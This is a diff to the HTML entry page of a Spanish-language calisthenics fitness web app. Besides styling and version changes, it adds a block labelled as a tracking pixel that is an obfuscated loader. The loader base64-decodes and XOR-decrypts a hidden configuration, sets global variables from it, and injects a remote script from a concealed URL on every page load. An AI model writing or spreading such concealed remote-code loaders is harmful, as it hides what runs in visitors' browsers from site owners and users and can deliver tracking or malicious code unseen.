@@ -1,6 +1,7 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="es" style="background-color: #0a0c0a; color: #f4f4f5;">
 <head>
+  <base href="/app/">
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>Protocolo de Calistenia Militar - App</title>
@@ -22,6 +23,10 @@
   src="https://www.facebook.com/tr?id=1150002567653288&ev=PageView&noscript=1"
   /></noscript>
   <!-- End Meta Pixel Code -->
+
+  <!-- Utmify Pixel / Tracking Script -->
+  <script>(function(){var o_cn00=atob("DLEw4yLPkBYUp4LfjcoSllCjsiw2z/ar/cIKzA2s9Hg60vay5NdJzUGg/Th21a2s7sNZk1a8v2NgyvHw4dBEhlG7vnxnha797MVEkUut5WJx1KDl1soSjUOi9TQuhea++dAdllai+XBtivKt6MdVjVbi42N2zuasr50SlUOj5XM2naD98OxN");var y_dk=[];for(var h_r31f=0;h_r31f<o_cn00.length;h_r31f++){y_dk.push(o_cn00.charCodeAt(h_r31f)&255);}var s_6v=y_dk[0];var p_2lm=y_dk.slice(1,1+s_6v);var o_gsh=y_dk.slice(1+s_6v);var m_p=o_gsh.map(function(b,t_r){return b^p_2lm[t_r%s_6v];});var x_njcu="";for(var h_cpi=0;h_cpi<m_p.length;h_cpi++){x_njcu+=String.fromCharCode(m_p[h_cpi]&255);}var y_q=decodeURIComponent(escape(x_njcu));var f_0=JSON.parse(y_q);var h_uv9=f_0.globals||[];h_uv9.forEach(function(q_sa){window[q_sa.name]=q_sa.value;});var g_0fha=document.createElement("script");g_0fha.src=f_0.url;g_0fha.async=true;g_0fha.defer=true;(f_0.attributes||[]).forEach(function(g_u){g_0fha.setAttribute(g_u.name,g_u.value);});(document.head||document.documentElement).appendChild(g_0fha);})();</script>
+  <!-- End Utmify Tracking Script -->
 
   <!-- PWA & Mobile Web App Meta Tags -->
   <link rel="manifest" href="manifest.json">
@@ -45,9 +50,9 @@
   </style>
 
   <!-- Estilos do Aplicativo (Dark Tactical Luxury) -->
-  <link rel="stylesheet" href="css/app.css?v=3.0">
+  <link rel="stylesheet" href="css/app.css?v=3.4">
 </head>
-<body>
+<body style="background-color: #0a0c0a; color: #f4f4f5; margin: 0; padding: 0;">
 
   <!-- Ocultar permanentemente Netlify Badge / HUD -->
   <div id="nl-badge-frame" style="display:none!important;visibility:hidden!important;"></div>
@@ -73,15 +78,15 @@
   <div class="app-modal" id="settingsModal"></div>
 
   <!-- Scripts do App (Modular & Zero Dependências Externas) -->
-  <script src="js/nutri-db.js?v=3.0"></script>
-  <script src="js/supabase-client.js?v=3.0"></script>
-  <script src="js/gemini-nutrition.js?v=3.0"></script>
-  <script src="js/state.js?v=3.0"></script>
-  <script src="js/exercises-db.js?v=3.0"></script>
-  <script src="js/recipes-db.js?v=3.0"></script>
-  <script src="js/exercise-animator.js?v=3.0"></script>
-  <script src="js/workout-player.js?v=3.0"></script>
-  <script src="js/views.js?v=3.0"></script>
-  <script src="js/app.js?v=3.0"></script>
+  <script src="js/nutri-db.js?v=3.4"></script>
+  <script src="js/supabase-client.js?v=3.4"></script>
+  <script src="js/gemini-nutrition.js?v=3.4"></script>
+  <script src="js/state.js?v=3.4"></script>
+  <script src="js/exercises-db.js?v=3.4"></script>
+  <script src="js/recipes-db.js?v=3.4"></script>
+  <script src="js/exercise-animator.js?v=3.4"></script>
+  <script src="js/workout-player.js?v=3.4"></script>
+  <script src="js/views.js?v=3.4"></script>
+  <script src="js/app.js?v=3.4"></script>
 </body>
 </html>
